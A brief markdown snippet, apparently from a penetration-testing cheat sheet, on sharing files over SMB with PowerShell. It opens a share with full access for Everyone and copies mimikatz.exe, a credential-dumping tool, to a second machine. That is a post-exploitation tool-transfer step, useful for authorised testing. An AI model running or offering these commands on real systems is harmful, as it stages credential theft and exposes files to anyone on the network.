# SMB Share

<details>

<summary>Powershell Method</summary>

On Sender:

```
Set-SmbServerConfiguration -EnableSMB2Protocol $true -Force
net share PublicShare=C:\temp /GRANT:Everyone,FULL
```

On Receiver:

```
copy \\appsrv01\PublicShare\mimikatz.exe .
```
